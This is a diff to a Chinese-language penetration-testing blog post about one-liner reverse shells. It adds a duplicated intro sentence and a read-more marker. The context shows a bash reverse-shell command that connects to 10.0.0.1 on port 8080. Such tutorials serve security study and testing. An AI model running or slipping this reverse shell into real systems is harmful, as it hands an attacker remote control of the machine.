@@ -8,6 +8,11 @@ categories: 渗透
 ---
 
 除以下介绍的一句话反弹shell姿势外，还有一种back.py反弹，推荐
+bash版本，所有语句注意修改端口
+
+<!-- more -->
+
+除以下介绍的一句话反弹shell姿势外，还有一种back.py反弹，推荐
 bash版本，注意修改端口
 
     bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
